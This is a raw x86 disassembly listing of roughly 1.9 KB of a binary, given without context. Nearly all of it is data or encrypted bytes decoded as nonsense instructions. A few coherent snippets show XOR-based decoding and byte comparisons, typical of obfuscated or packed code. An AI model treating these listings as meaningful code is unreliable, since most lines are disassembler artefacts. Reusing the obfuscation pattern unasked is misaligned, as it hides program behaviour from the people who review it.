  407aa2:	push   es
  407aa3:	retf   
  407aa4:	and    al,0xbf
  407aa6:	mov    ds:0xb26fb17c,eax
  407aab:	out    dx,eax
  407aac:	enter  0x240b,0xb1
  407ab0:	scas   eax,DWORD PTR es:[edi]
  407ab1:	mov    al,ds:0x24e16abd
  407ab6:	inc    ebx
  407ab7:	sub    al,0x20
  407ab9:	jp     0x407aef
  407abb:	(bad)  
  407abc:	int3   
  407abd:	jmp    0x5795:0xc5646367
  407ac4:	stos   BYTE PTR es:[edi],al
  407ac5:	push   ebp
  407ac6:	daa    
  407ac7:	sub    al,0x5f
  407ac9:	sbb    ah,ah
  407acb:	or     eax,0xec706973
  407ad0:	mov    ds:0x990d9aca,eax
  407ad5:	test   eax,0xd55c22cc
  407ada:	mov    ds:0x78e26ccd,al
  407adf:	pop    ebp
  407ae0:	retf   0xfce5
  407ae3:	or     eax,0xee1d0df4
  407ae8:	push   eax
  407ae9:	loop   0x407aad
  407aeb:	sti    
  407aec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407aed:	inc    ebx
  407aee:	repnz (bad) 
  407af0:	jmp    0x1eab:0xa623a165
  407af7:	rcl    BYTE PTR fs:[edx],cl
  407afa:	xor    BYTE PTR [ebp+0x11c89c12],cl
  407b00:	(bad)  
  407b01:	jo     0x407b6b
  407b03:	or     DWORD PTR [edi+0x59],ebx
  407b06:	push   ebp
  407b07:	dec    edi
  407b08:	sti    
  407b09:	dec    esi
  407b0a:	popa   
  407b0b:	sbb    al,0x79
  407b0d:	ins    BYTE PTR es:[edi],dx
  407b0e:	adc    BYTE PTR [esi-0x4b],dh
  407b11:	pop    es
  407b12:	xor    eax,0xd87da63f
  407b17:	mov    eax,DWORD PTR [ebp+0x8]
  407b1a:	movzx  eax,WORD PTR [eax+edx*4]
  407b1e:	xor    eax,0x8a40
  407b23:	add    eax,edi
  407b25:	mov    edi,DWORD PTR [ebp-0x14]
  407b28:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407b2c:	mov    eax,DWORD PTR [ebp-0xc]
  407b2f:	inc    edx
  407b30:	cmp    edx,eax
  407b32:	jne    0x407679
  407b38:	pop    edi
  407b39:	pop    ebx
  407b3a:	jmp    0x407cbb
  407b3f:	fistp  QWORD PTR [edi]
  407b41:	aas    
  407b42:	or     bl,bh
  407b44:	or     ch,bl
  407b46:	jmp    0x407b0d
  407b48:	jle    0x407b96
  407b4a:	dec    ebx
  407b4b:	add    BYTE PTR [edi-0x3a82f8de],ah
  407b51:	jle    0x407bd1
  407b53:	sar    BYTE PTR [edi+0x7e],cl
  407b56:	jle    0x407ba3
  407b58:	xor    DWORD PTR [esi+0x3be3a420],eax
  407b5e:	pop    ds
  407b5f:	les    ebp,FWORD PTR [edx]
  407b61:	jecxz  0x407b01
  407b63:	mov    dl,ah
  407b65:	dec    ebx
  407b66:	call   0xbea5e288
  407b6b:	daa    
  407b6c:	push   ebx
  407b6d:	rol    DWORD PTR [edx],cl
  407b6f:	inc    edi
  407b70:	mov    ah,0x7f
  407b72:	(bad)  
  407b73:	mov    bl,0xe9
  407b75:	icebp  
  407b76:	sub    eax,0x4edcd0c7
  407b7b:	dec    esp
  407b7c:	mov    ebp,0x7aea1cee
  407b81:	xchg   ebx,eax
  407b82:	or     al,0x69
  407b84:	jle    0x407b42
  407b86:	pop    ss
  407b87:	ret    0x90da
  407b8a:	sub    BYTE PTR [ecx-0x4e40c233],0xf3
  407b91:	int3   
  407b92:	std    
  407b93:	inc    edi
  407b94:	pop    ds
  407b95:	lods   eax,DWORD PTR ds:[esi]
  407b96:	int3   
  407b97:	push   0x89512bb7
  407b9c:	cmp    DWORD PTR [edi+edx*1+0x28],esi
  407ba0:	inc    edx
  407ba1:	mov    ecx,0x610103f6
  407ba6:	not    DWORD PTR [ebp+0x4901ba7f]
  407bac:	jae    0x407bf1
  407bae:	mov    ah,0x20
  407bb0:	out    dx,eax
  407bb1:	neg    cl
  407bb3:	iret   
  407bb4:	retf   0xcbc4
  407bb7:	push   esp
  407bb8:	sbb    ecx,ecx
  407bba:	popf   
  407bbb:	sti    
  407bbc:	lods   eax,DWORD PTR ds:[esi]
  407bbd:	sbb    al,0xb1
  407bbf:	sbb    al,0x83
  407bc1:	or     BYTE PTR [eax],0x6e
  407bc4:	xchg   BYTE PTR [edx+0x15],dh
  407bc7:	(bad)  
  407bc8:	sbb    BYTE PTR [edi+edx*1+0x29695423],ch
  407bcf:	push   0x3ccf2de6
  407bd4:	and    al,0xd9
  407bd6:	ficomp DWORD PTR [edx]
  407bd9:	es in  al,0xee
  407bdc:	push   ebp
  407bdd:	scas   al,BYTE PTR es:[edi]
  407bde:	fucomi st,st(3)
  407be0:	pop    ecx
  407be1:	lds    ebp,FWORD PTR [edi]
  407be3:	scas   al,BYTE PTR es:[edi]
  407be4:	icebp  
  407be5:	out    dx,al
  407be6:	loop   0x407c3a
  407be8:	ret    0xf561
  407beb:	sbb    BYTE PTR [edi-0x43e558af],bh
  407bf1:	add    DWORD PTR ds:0x820536cb,ebp
  407bf7:	lahf   
  407bf8:	inc    BYTE PTR [ebp+0x5e31bc20]
  407bfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bff:	test   eax,0x8e112282
  407c04:	cmp    BYTE PTR [eax-0xe],dl
  407c07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c08:	xor    DWORD PTR [esi],edx
  407c0a:	shl    BYTE PTR [ecx-0x2a9cf43b],1
  407c10:	sub    ebp,DWORD PTR [ebx-0x228fb33]
  407c16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c17:	daa    
  407c18:	mov    ecx,ecx
  407c1a:	push   edi
  407c1b:	push   eax
  407c1c:	popf   
  407c1d:	loope  0x407c49
  407c1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c20:	push   cs
  407c21:	lods   eax,DWORD PTR ds:[esi]
  407c22:	aam    0x49
  407c24:	stos   BYTE PTR es:[edi],al
  407c25:	adc    al,BYTE PTR [eax-0x24]
  407c28:	ins    BYTE PTR es:[edi],dx
  407c29:	push   ds
  407c2a:	xchg   edi,eax
  407c2b:	das    
  407c2c:	mov    ebp,0xab5b8069
  407c31:	aam    0x10
  407c33:	aam    0x7b
  407c35:	mov    bh,0xdc
  407c37:	ss fucomip st,st(4)
  407c3a:	(bad)  
  407c3b:	mul    BYTE PTR [ecx+0x1b57f8b7]
  407c41:	and    al,0xdf
  407c43:	mov    ah,ah
  407c45:	jb     0x407c89
  407c47:	jb     0x407c3d
  407c49:	mov    bl,ch
  407c4b:	mov    ch,0xad
  407c4d:	jl     0x407ca6
  407c4f:	and    eax,0x25f3f0c6
  407c54:	out    dx,eax
  407c55:	rcr    BYTE PTR [eax+eiz*1],0xb5
  407c59:	sbb    cl,BYTE PTR [esi]
  407c5b:	fnstcw WORD PTR [ebp+0x3b7a6b5d]
  407c61:	sti    
  407c62:	push   es
  407c63:	xor    dh,bl
  407c65:	dec    edx
  407c66:	mov    WORD PTR [esp+esi*4],fs
  407c69:	mov    ah,0x76
  407c6b:	xor    esp,DWORD PTR [ebp-0x4eaaec48]
  407c71:	mov    esi,0xaf0be8f8
  407c76:	ins    BYTE PTR es:[edi],dx
  407c77:	in     eax,0xfe
  407c79:	sub    dh,BYTE PTR [ebp-0x52b2edf8]
  407c7f:	push   DWORD PTR [esi]
  407c81:	sub    dl,cl
  407c83:	mov    cl,dh
  407c85:	lahf   
  407c86:	ss (bad) 
  407c88:	jmp    DWORD PTR [edi-0x49709ebc]
  407c8e:	cmp    eax,0xf9751e93
  407c93:	sti    
  407c94:	dec    eax
  407c95:	nop
  407c96:	pop    es
  407c97:	xchg   ebx,eax
  407c98:	hlt    
  407c99:	inc    esi
  407c9a:	inc    ebp
  407c9b:	daa    
  407c9c:	add    eax,0x11e6db33
  407ca1:	inc    eax
  407ca2:	sub    eax,0xe931eeed
  407ca7:	sub    al,0x6d
  407ca9:	jo     0x407c4d
  407cab:	sub    ah,al
  407cad:	(bad)  
  407cae:	sti    
  407caf:	repz out 0x15,eax
  407cb2:	jecxz  0x407c9b
  407cb4:	icebp  
  407cb5:	stos   BYTE PTR es:[edi],al
  407cb6:	add    DWORD PTR [ebx-0x7467af7e],edx
  407cbc:	inc    ebp
  407cbd:	clc    
  407cbe:	mov    edx,DWORD PTR [ebp+0x10]
  407cc1:	xor    eax,ecx
  407cc3:	add    eax,esi
  407cc5:	mov    DWORD PTR [edx],eax
  407cc7:	mov    eax,DWORD PTR [ebp-0x8]
  407cca:	xor    eax,ecx
  407ccc:	add    eax,esi
  407cce:	jmp    0x407e4f
  407cd3:	mov    bh,0xb6
  407cd5:	(bad)  
  407cd6:	ror    DWORD PTR [edi+0x86a7bfb],cl
  407cdc:	dec    ebx
  407cdd:	ror    DWORD PTR [edx],cl
  407cdf:	out    dx,al
  407ce0:	inc    edi
  407ce1:	test   ebx,edx
  407ce3:	rol    edi,1
  407ce5:	jle    0x407d65
  407ce7:	sar    BYTE PTR [edi+0x7e],cl
  407cea:	jle    0x407cc6
  407cec:	jge    0x407cc6
  407cee:	or     BYTE PTR [esi-0xc],bl
  407cf1:	push   ss
  407cf2:	fsubr  st,st(5)
  407cf4:	fld    st(4)
  407cf6:	push   ss
  407cf7:	(bad)  
  407cf8:	addr16 push eax
  407cfa:	fmul   DWORD PTR [edi+0x43f8369]
  407d00:	rdpmc  
  407d02:	pop    esi
  407d03:	jl     0x407d37
  407d05:	nop
  407d06:	loopne 0x407ced
  407d08:	jno    0x407c8e
  407d0a:	scas   eax,DWORD PTR es:[edi]
  407d0b:	or     DWORD PTR [edx],ecx
  407d0d:	push   cs
  407d0e:	add    DWORD PTR [edx+eiz*8+0x12],ebx
  407d12:	jno    0x407cb3
  407d14:	fadd   DWORD PTR [edi]
  407d16:	inc    esp
  407d17:	adc    eax,0xbe64e31e
  407d1c:	idiv   ebp
  407d1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d1f:	fnsave [ecx+esi*8+0x6a]
  407d23:	arpl   WORD PTR [ebp-0x44],cx
  407d26:	jg     0x407d46
  407d28:	adc    eax,0x2d7119ef
  407d2d:	pushf  
  407d2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d2f:	outs   dx,BYTE PTR ds:[esi]
  407d30:	mov    cl,0x61
  407d32:	lahf   
  407d33:	sbb    bh,bl
  407d35:	fstp   TBYTE PTR [esi]
  407d37:	inc    esi
  407d38:	popf   
  407d39:	into   
  407d3a:	test   al,0x91
  407d3c:	xchg   esi,eax
  407d3d:	popa   
  407d3e:	mov    ebx,0xefb146e1
  407d43:	(bad)  [edx]
  407d45:	leave  
  407d46:	outs   dx,DWORD PTR ds:[esi]
  407d47:	daa    
  407d48:	jnp    0x407dbb
  407d4a:	and    BYTE PTR [edx+0x7a2b99b4],bl
  407d50:	push   eax
  407d51:	dec    edi
  407d52:	inc    ecx
  407d53:	sbb    DWORD PTR [ebx],0x3abbc55e
  407d59:	fiadd  WORD PTR [eax]
  407d5b:	add    eax,0x24f09533
  407d60:	jo     0x407db5
  407d62:	imul   esi,DWORD PTR [esi-0x69df3896],0xffffffa9
  407d69:	cmc    
  407d6a:	fs ins BYTE PTR es:[edi],dx
  407d6c:	fisub  DWORD PTR ds:0xde7ac91f
  407d72:	pop    esp
  407d73:	add    ecx,edi
  407d75:	les    ecx,FWORD PTR [eax+0x6bf9ac13]
  407d7b:	outs   dx,DWORD PTR ds:[esi]
  407d7c:	xor    bh,BYTE PTR [edx+ebp*8+0x2a62bda1]
  407d83:	jmp    0xecf952d
  407d88:	call   0x6671:0x28996c43
  407d8f:	or     BYTE PTR [edi],0xd7
  407d92:	dec    edi
  407d93:	(bad)  
  407d94:	fnstenv [esi+0x20]
  407d97:	pop    es
  407d98:	push   es
  407d99:	nop
  407d9a:	mov    ebx,0xbbcd4fa2
  407d9f:	hlt    
  407da0:	dec    edx
  407da1:	mov    esp,0xc5399f00
  407da6:	ds repnz out 0x3d,eax
  407daa:	sub    BYTE PTR [eax],ch
  407dac:	xor    eax,0x1ab8dc42
  407db1:	mov    al,ds:0x3b5da30f
  407db6:	scas   al,BYTE PTR es:[edi]
  407db7:	inc    DWORD PTR [esi+eiz*8-0x27]
  407dbb:	mov    ch,0x77
  407dbd:	int3   
  407dbe:	xchg   BYTE PTR [esi-0x57d28a9e],ch
  407dc4:	adc    DWORD PTR [ecx],ebx
  407dc6:	jo     0x407e21
  407dc8:	xchg   edi,eax
  407dc9:	outs   dx,BYTE PTR ds:[esi]
  407dca:	sbb    BYTE PTR [esi-0x69],bl
  407dcd:	sub    al,0xb7
  407dcf:	sub    DWORD PTR [ecx-0x1cca5ff0],esp
  407dd5:	jns    0x407e2c
  407dd7:	fsubr  DWORD PTR [ecx]
  407dd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dda:	das    
  407ddb:	pop    es
  407ddc:	repnz push esp
  407dde:	outs   dx,BYTE PTR ds:[esi]
  407ddf:	in     al,0x4c
  407de1:	mov    ch,0x64
  407de3:	loope  0x407ddb
  407de5:	inc    ebx
  407de6:	sub    ch,ch
  407de8:	int3   
  407de9:	outs   dx,BYTE PTR ds:[esi]
  407dea:	sub    ebp,DWORD PTR [ebx+0x7f869ac8]
  407df0:	mov    esp,0xca0ef4a2
  407df5:	adc    BYTE PTR [esi],dh
  407df7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407df8:	sbb    eax,0x74e19363
  407dfd:	cmp    DWORD PTR [eax-0xbdc838b],esi
  407e03:	dec    edx
  407e04:	cs cld 
  407e06:	push   esi
  407e07:	xor    ebp,DWORD PTR [edi-0x10c96700]
  407e0d:	into   
  407e0e:	inc    edi
  407e0f:	xchg   esp,eax
  407e10:	inc    eax
  407e11:	retfw  0x3325
  407e15:	int3   
  407e16:	sbb    edx,DWORD PTR [ebp+0x29]
  407e19:	pop    eax
  407e1a:	mov    eax,0xcf6eaba0
  407e1f:	imul   edi,DWORD PTR [eax+edx*2],0xffffff86
  407e23:	dec    edi
  407e24:	dec    ecx
  407e25:	lods   eax,DWORD PTR ds:[esi]
  407e26:	repz sbb BYTE PTR [ebp-0x13],bl
  407e2a:	pop    eax
  407e2b:	push   ds
  407e2c:	mov    dh,0xff
  407e2e:	mov    edx,0x7f1e9684
  407e33:	vmread edi,ebp
  407e36:	iret   
  407e37:	lahf   
  407e38:	dec    ebx
  407e39:	push   esp
  407e3a:	es aaa 
  407e3c:	test   DWORD PTR [edi+ebp*8-0x59],edi
  407e40:	cmp    ecx,DWORD PTR [eax-0x72]
  407e43:	loop   0x407e1e
  407e45:	lods   al,BYTE PTR ds:[esi]
  407e46:	stc    
  407e47:	fisttp QWORD PTR ds:0xde4e330c
  407e4d:	inc    esi
  407e4e:	xchg   DWORD PTR [ecx+0x458b0845],ecx
  407e54:	or     BYTE PTR [edx-0x7557fabc],cl
  407e5a:	push   ebp
  407e5b:	(bad)  
  407e5c:	cmp    al,dl
  407e5e:	je     0x4081a3
  407e64:	mov    eax,DWORD PTR [ebp+0x8]
  407e67:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e6b:	mov    edx,DWORD PTR [ebp+0xc]
  407e6e:	cmp    al,BYTE PTR [edx]
  407e70:	jne    0x40834a
  407e76:	mov    eax,DWORD PTR [ebp-0x8]
  407e79:	mov    edx,DWORD PTR [ebp+0xc]
  407e7c:	movsx  edx,BYTE PTR [edx]
  407e7f:	xor    eax,ecx
  407e81:	add    eax,esi
  407e83:	cmp    edx,eax
  407e85:	je     0x40833e
  407e8b:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  407e92:	lea    eax,[ebp-0x18]
  407e95:	jmp    0x408016
  407e9a:	xchg   BYTE PTR [eax],cl
  407e9c:	mov    al,ds:0xb8a6a08e
  407ea1:	or     BYTE PTR [edx],ah
  407ea3:	mov    bl,cl
  407ea5:	mov    dl,0x86
  407ea7:	add    al,0xb9
  407ea9:	adc    eax,0x7e7ed8b5
  407eae:	sar    BYTE PTR [edi+0x7e],cl
  407eb1:	jle    0x407f09
  407eb3:	adc    al,dh
  407eb5:	sar    BYTE PTR [edx],cl
  407eb7:	clc    
  407eb8:	fld    TBYTE PTR es:[eax]
  407ebb:	mov    ebx,0x52124058
  407ec0:	cmp    dh,bh
  407ec2:	cwde   
  407ec3:	and    BYTE PTR [esi],0x5c
  407ec6:	popf   
  407ec7:	add    edi,ecx
  407ec9:	sbb    al,0xa2
  407ecb:	inc    esp
  407ecc:	pop    eax
  407ecd:	idiv   DWORD PTR [ebx]
  407ecf:	push   esp
  407ed0:	mov    DWORD PTR [esi-0x8],esi
  407ed3:	mov    fs,esi
  407ed5:	ror    BYTE PTR [edx-0x20],1
  407ed8:	das    
  407ed9:	and    DWORD PTR [esi],0x43
  407edc:	adc    al,0x66
  407ede:	add    al,0x85
  407ee0:	cmp    DWORD PTR [edx-0x6e],edx
  407ee3:	test   BYTE PTR [edi-0x3f5870c4],al
  407ee9:	js     0x407f0b
  407eeb:	mov    WORD PTR [ecx+ebp*4+0x21],fs
  407eef:	mov    eax,0xc48ff84b
  407ef4:	push   ebx
  407ef5:	loop   0x407f70
  407ef7:	cmp    al,0xac
  407ef9:	cs mov bh,0x5a
  407efc:	stos   DWORD PTR es:[edi],eax
  407efd:	dec    ebp
  407efe:	stos   DWORD PTR es:[edi],eax
  407eff:	std    
  407f00:	mov    ds:0x3e752691,al
  407f05:	sahf   
  407f06:	mov    ch,0x8a
  407f08:	repz (bad) gs:[ebp+0x2108dbfd]
  407f10:	in     eax,dx
  407f11:	xchg   esp,eax
  407f12:	icebp  
  407f13:	mov    esi,DWORD PTR [eax-0x51c2a11e]
  407f19:	pop    ebx
  407f1a:	push   eax
  407f1b:	scas   eax,DWORD PTR es:[edi]
  407f1c:	xchg   esp,eax
  407f1d:	mov    edx,0xa474445c
  407f22:	pop    ebp
  407f23:	adc    esp,DWORD PTR [edx]
  407f25:	int3   
  407f26:	inc    ebx
  407f27:	aas    
  407f28:	lea    esp,[edx+0x28]
  407f2b:	inc    edx
  407f2c:	jae    0x407f75
  407f2e:	js     0x407ee5
  407f30:	cmp    eax,0xb347b072
  407f35:	cwde   
  407f36:	mov    bl,0xcc
  407f38:	inc    esi
  407f39:	cdq    
  407f3a:	sub    dh,bh
  407f3c:	int3   
  407f3d:	and    dh,BYTE PTR ds:0x8112ea33
  407f43:	bound  edi,QWORD PTR [ebx-0x3ff60275]
  407f49:	fcomi  st,st(5)
  407f4b:	add    al,0x5c
  407f4d:	stc    
  407f4e:	fisubr DWORD PTR [edx+0x655b5996]
  407f54:	jb     0x407f8d
  407f56:	fmulp  st(5),st
  407f58:	mov    ds:0x3e04e55,al
  407f5d:	lahf   
  407f5e:	jbe    0x407f55
  407f60:	push   cs
  407f61:	mov    esp,0xddcc16af
  407f66:	add    ah,BYTE PTR ds:0x30679e2d
  407f6c:	in     al,dx
  407f6d:	int    0xc6
  407f6f:	ss jecxz 0x407f82
  407f72:	inc    eax
  407f73:	inc    ebx
  407f74:	push   cs
  407f75:	xchg   ecx,eax
  407f76:	inc    ecx
  407f77:	xchg   ebp,eax
  407f78:	adc    al,0xc4
  407f7a:	in     eax,dx
  407f7b:	int    0x8e
  407f7d:	loop   0x407ff1
  407f7f:	push   edi
  407f80:	das    
  407f81:	xor    eax,0x396f91b1
  407f86:	cli    
  407f87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f88:	dec    eax
  407f89:	sub    al,0xcf
  407f8b:	mov    dl,0xd2
  407f8d:	dec    ebx
  407f8e:	repnz out dx,eax
  407f90:	mov    esi,0x3a4b73dc
  407f95:	ins    BYTE PTR es:[edi],dx
  407f96:	neg    DWORD PTR [edx+0x302f2347]
  407f9c:	push   0x450843a8
  407fa1:	popa   
  407fa2:	xlat   BYTE PTR ds:[ebx]
  407fa3:	xchg   ebx,eax
  407fa4:	dec    eax
  407fa5:	mov    WORD PTR [ecx],cs
  407fa7:	cmp    al,0xc6
  407fa9:	(bad)  
  407fab:	dec    esp
  407fac:	jl     0x407f35
  407fae:	rcl    BYTE PTR [ebx+0x2b],cl
  407fb1:	mov    edi,0x104b7e2b
  407fb6:	inc    edi
  407fb7:	adc    esp,DWORD PTR [ebx+0x4b]
  407fba:	stos   BYTE PTR es:[edi],al
  407fbb:	and    eax,0x35e9cad3
  407fc0:	(bad)  
  407fc1:	mov    bh,0x30
  407fc3:	sub    al,bh
  407fc5:	and    ah,BYTE PTR [ebp-0x20785603]
  407fcb:	daa    
  407fcc:	adc    bl,BYTE PTR [ebx]
  407fce:	or     al,0x82
  407fd0:	loope  0x407fd9
  407fd2:	jns    0x407fca
  407fd4:	cmc    
  407fd5:	xor    BYTE PTR [ecx-0x7c3a7968],dl
  407fdb:	xor    bh,BYTE PTR [edx-0x3d]
  407fde:	repz call 0x13c50836
  407fe4:	jge    0x407f8c
  407fe6:	dec    ebx
  407fe7:	or     esi,0xc837e394
  407fed:	or     al,BYTE PTR [edx]
  407fef:	sbb    DWORD PTR [ebx-0x42],ebx
  407ff2:	or     BYTE PTR [edi],ch
  407ff4:	pushf  
  407ff5:	mov    cs:0x6d684e43,al
  407ffb:	push   esp
  407ffc:	sti    
  407ffd:	add    ah,BYTE PTR [eax+ebx*8-0x76]
  408001:	mov    esi,DWORD PTR [ebp-0x4e]
  408004:	shr    BYTE PTR [eax-0x3c],cl
  408007:	pusha  
  408008:	jo     0x407fd6
  40800a:	popa   
  40800b:	pop    esp
  40800c:	jl     0x407fe7
  40800e:	sub    eax,0x52633dbd
  408013:	adc    BYTE PTR ds:0xec458969,cl
  408019:	mov    eax,DWORD PTR [ebp-0x14]
  40801c:	add    DWORD PTR [eax],0x705fa8f
  408022:	jmp    0x4081a3
  408027:	test   al,0x70
  408029:	cmp    ch,BYTE PTR [ecx-0x46]
  40802c:	jge    0x4080ab
  40802e:	xor    DWORD PTR [edx-0x4f],eax
  408031:	imul   esi,DWORD PTR [edx+0x5da182e2],0x7e7eda29
  40803b:	sar    BYTE PTR [edi+0x7e],cl
  40803e:	jle    0x40809d
  408040:	std    
  408041:	mov    WORD PTR [eax+0x15],ss
  408044:	jnp    0x408009
  408046:	mov    ds:0x273ee319,eax
  40804b:	mov    cl,cl
  40804d:	xor    BYTE PTR [esi+0x3e],0x21
  408051:	mov    ebp,edi
  408053:	jae    0x407fe9
  408055:	dec    esp
  408056:	adc    eax,DWORD PTR [esi+0x762e2bfd]
  40805c:	test   BYTE PTR [ecx],bh
  40805e:	sbb    esp,eax
  408060:	lea    esp,[esp+eiz*8+0x4cd030eb]
  408067:	xchg   bh,ch
  408069:	fsubr  QWORD PTR [ecx]
  40806b:	push   edi
  40806c:	outs   dx,BYTE PTR ds:[esi]
  40806d:	sub    edi,esp
  40806f:	and    al,0xdd
  408071:	loopne 0x4080f2
  408073:	fxch   st(3)
  408075:	loope  0x4080dd
  408077:	mov    ah,0x3a
  408079:	push   ds
  40807a:	fldcw  WORD PTR [ebx+0x5a050e8f]
  408080:	das    
  408081:	shl    BYTE PTR [esi-0x3e],cl
  408084:	xchg   DWORD PTR [ebx+0x1dfef7ea],edx
  40808a:	clc    
  40808b:	stos   DWORD PTR es:[edi],eax
  40808c:	push   esp
  40808d:	lea    ebp,[edi]
  40808f:	jge    0x4080cd
  408091:	or     eax,0x2ee29a7a
  408096:	fdiv   QWORD PTR [ecx-0x686d5c06]
  40809c:	pop    ebx
  40809d:	cmp    ecx,DWORD PTR [ecx+0x309383c6]
  4080a3:	mov    al,ds:0x75914094
  4080a8:	adc    al,0xac
  4080aa:	mov    dh,0xbf
  4080ac:	xchg   esp,eax
  4080ad:	pop    es
  4080ae:	ret    
  4080af:	mov    ebx,0xa5a084a9
  4080b4:	pop    es
  4080b5:	ror    BYTE PTR [edi-0x50b3b468],1
  4080bb:	popf   
  4080bc:	inc    esi
  4080bd:	cld    
  4080be:	dec    BYTE PTR ds:0x3bf5a5c4
  4080c4:	cwde   
  4080c5:	pop    ecx
  4080c6:	push   es
  4080c7:	lea    esi,[edx-0x5633400a]
  4080cd:	leave  
  4080ce:	(bad)  
  4080d0:	and    BYTE PTR [ebx+edx*8+0x6eccefea],dl
  4080d7:	test   ah,bh
  4080d9:	mov    ebp,0xf38ff40
  4080de:	ss or  eax,0xea86872c
  4080e4:	or     eax,0xe841a60b
  4080e9:	pop    ds
  4080ea:	jbe    0x408129
  4080ec:	or     al,ch
  4080ee:	mov    edi,0xd7f240ee
  4080f3:	inc    ebp
  4080f4:	ja     0x4080ef
  4080f6:	cmc    
  4080f7:	bound  esi,QWORD PTR [esp+ebx*4]
  4080fa:	dec    eax
  4080fb:	pop    ss
  4080fc:	add    eax,0x8db3ba68
  408101:	dec    esi
  408102:	arpl   WORD PTR [ebp-0x18bf8d00],di
  408108:	push   eax
  408109:	and    edi,DWORD PTR [ebx+edx*8]
  40810c:	shl    DWORD PTR [edi-0x6d739872],1
  408112:	fild   WORD PTR [ecx-0x6f]
  408115:	mov    ecx,0x9ed37124
  40811a:	ja     0x4080ab
  40811c:	mov    cl,0xc2
  40811e:	daa    
  40811f:	xchg   ebp,eax
  408120:	dec    edx
  408121:	inc    ecx
  408122:	and    DWORD PTR [ecx+0x7c],ebp
  408125:	in     al,dx
  408126:	loope  0x408183
  408128:	jmp    0x408141
  40812a:	mov    dh,0xb8
  40812c:	fwait
  40812d:	into   
  40812e:	arpl   WORD PTR [ebp+0x15],bp
  408131:	nop
  408132:	imul   ebp,esp,0xffffffaf
  408135:	and    DWORD PTR [esp+ebp*1+0xf],0x37
  40813a:	mov    al,0x5e
  40813c:	test   eax,0x75b73091
  408141:	pop    ebp
  408142:	(bad)  
  408144:	mov    ah,0x67
  408146:	mov    WORD PTR [ecx+0x36],?
  408149:	jae    0x40812b
  40814b:	bound  ebp,QWORD PTR [edx-0x4ee7cf8a]
  408151:	enter  0x2f08,0xe3
  408155:	leave  
  408156:	cmp    eax,0x44ca4207
  40815b:	pop    ebx
  40815c:	mov    ecx,0xccda348c
  408161:	out    0xfd,al
  408163:	jne    0x4081c8
  408165:	cmp    bl,ch
  408167:	inc    ebx
  408168:	jmp    0x2da1b78b
  40816d:	xor    BYTE PTR [edx+ebx*8-0x25171a50],dl
  408174:	cmp    bl,ch
  408176:	xchg   ebx,eax
  408177:	and    al,0xcb
  408179:	sbb    eax,0x5a8a09eb
  40817e:	or     ecx,ebx
  408180:	add    edx,DWORD PTR [esi]
  408182:	pop    ds
  408183:	mov    ch,BYTE PTR [esi+eax*2+0x4e]
  408187:	out    0xeb,eax
  408189:	cmc    
  40818a:	sbb    eax,0x6cb69c2
  40818f:	mov    ah,0xe8
  408191:	sub    DWORD PTR [edx],0xfccccdc0
  408197:	mov    cl,0x92
  408199:	js     0x4081c5
  40819b:	or     BYTE PTR [esi+eiz*4-0x54],bl
  40819f:	fist   DWORD PTR [ebx]
  4081a1:	idiv   BYTE PTR [ebp-0x740fba75]
  4081a7:	push   ebp
  4081a8:	or     BYTE PTR [ebx],dh
  4081aa:	shr    ecx,0x7c
  4081ad:	add    DWORD PTR [eax],eax
  4081af:	add    BYTE PTR [edx-0x80],cl
  4081b2:	fld    QWORD PTR [edi]
  4081b4:	fstp   QWORD PTR [ebx+0x4c]
  4081b7:	inc    ebp
  4081b8:	inc    eax
  4081b9:	jmp    DWORD PTR [ebp+0x1a43bc8f]
  4081bf:	push   ebx
  4081c0:	(bad)  
  4081c1:	fstp   TBYTE PTR [esi+0x7e]
  4081c4:	sar    BYTE PTR [edi+0x7e],cl
  4081c7:	jle    0x40823e
  4081c9:	sti    
  4081ca:	loop   0x40818d
  4081cc:	mov    DWORD PTR [edx-0x24],esp
  4081cf:	mov    dh,BYTE PTR [edx-0x2997dc11]
  4081d5:	jns    0x4081dc
  4081d7:	mov    ds,WORD PTR [eax-0x52]
  4081da:	xor    BYTE PTR ds:0xa493b4bc,bl
  4081e0:	(bad)  
  4081e1:	arpl   WORD PTR [edx-0x70],di
  4081e4:	rcl    DWORD PTR [ecx+0x21],1
  4081e7:	dec    edi
  4081e8:	dec    esi
  4081e9:	and    ebp,edi
  4081eb:	aad    0x84
  4081ed:	test   BYTE PTR [eax-0x54],0x2c
  4081f1:	aad    0xc1
  4081f3:	arpl   WORD PTR [edi+0x29],bx
  4081f6:	sub    eax,0xf7d062b1
  4081fb:	stos   BYTE PTR es:[edi],al
  4081fc:	mov    cl,0xb3
  4081fe:	xchg   dl,dh
  408200:	loope  0x4081a7
  408202:	mov    edx,0xc549fc22
  408207:	stos   DWORD PTR es:[edi],eax
  408208:	mov    ebx,0x228876f1
  40820d:	mov    al,ds:0xbcd49961
  408212:	sbb    eax,0xf5219d8f
  408217:	call   0x2045e244
  40821c:	sbb    edi,esp
  40821e:	xchg   edi,eax
  40821f:	lea    ebx,[eax+0x477836d0]
  408225:	fdiv   DWORD PTR [ecx+0xee8fca3]
  40822b:	xor    DWORD PTR [ebx+eiz*4],ebx
  40822e:	add    DWORD PTR [edi-0x55c61e84],ebp
  408234:	pop    ds
  408235:	bound  edi,QWORD PTR [edx+0x587d4ab5]
  40823b:	sub    dh,BYTE PTR ds:0x1b7375ee
  408241:	arpl   WORD PTR [ebx+0x66],dx
  408244:	xor    DWORD PTR [edx+0x26],eax
  408247:	fsubr  QWORD PTR [edi+0x2466b043]
  40824d:	sub    BYTE PTR [edi-0xb5dfca4],ah
  408253:	sub    al,0xa1
  408255:	inc    edi
  408256:	(bad)  
  408258:	cmp    DWORD PTR [ecx-0x7f],esi
  40825b:	pop    edi
  40825c:	retf   0x293d
  40825f:	push   ss
  408260:	pop    ecx
  408261:	sbb    al,0x6d
  408263:	jae    0x408295
